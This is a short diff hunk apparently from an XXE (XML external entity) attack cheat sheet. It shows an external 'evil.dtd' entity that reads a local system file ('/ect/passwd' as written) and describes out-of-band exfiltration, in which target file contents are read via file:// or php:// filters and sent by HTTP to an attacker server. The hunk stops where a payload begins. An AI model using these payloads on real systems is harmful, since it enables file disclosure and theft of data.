@@ -19,7 +19,7 @@ B.
 contents of external evil.dtd     
 `<!ENTITY %evil SYSTEM "file:///ect/passwd">`   
 
-if NO ECHO situation:   
+C. if NO ECHO situation:   
 (You can use an external data channel to extract the data, first use file: // or php: // filter to get the content of the target file, and then send the content as an http request to the server that receives the data (attack server))     
 ```
 <! DOCTYPE updateProfile [ 
